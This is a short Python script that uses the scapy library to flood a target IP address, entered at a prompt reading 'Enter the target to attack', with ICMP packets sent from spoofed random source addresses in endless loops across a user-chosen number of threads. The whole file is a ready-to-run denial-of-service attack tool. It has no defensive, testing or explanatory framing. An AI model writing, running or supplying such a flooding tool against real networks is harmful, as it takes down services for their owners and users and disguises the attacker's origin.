from scapy.all import *
import threading


def icmp (i, ip):
    while True:
        print("Thread: ", i)
        send(IP(src=RandIP(), dst=ip)/ICMP())

threadList = list()

ip = input("Enter the target to attack: ")
thr = int(input("Threading: "))

for i in range(thr) :
    thrIcmp = threading.Thread(target = icmp, args = (i, ip))
    threadList.append(thrIcmp)
    thrIcmp.start()
